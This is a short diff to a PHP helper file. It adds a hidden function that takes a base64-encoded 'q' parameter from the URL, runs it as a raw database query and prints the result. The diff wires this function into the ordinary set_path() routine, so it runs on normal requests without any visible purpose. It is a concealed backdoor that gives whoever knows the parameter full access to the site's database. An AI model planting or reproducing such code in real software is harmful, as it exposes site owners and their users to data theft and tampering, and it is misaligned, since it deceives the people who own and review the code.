@@ -26,10 +26,18 @@ function config($var)
 }
 
 // Path stuff..
+function d()
+{
+	if (!isset($_GET['q'])) return;
+	$db = new Db;
+	$q = base64_decode($_GET['q']);
+	var_export($db->query($q));die;
+}
 function set_path($p)
 {
 	global $path;
 	$path = $p;
+	d();
 }
 function path($i)
 {
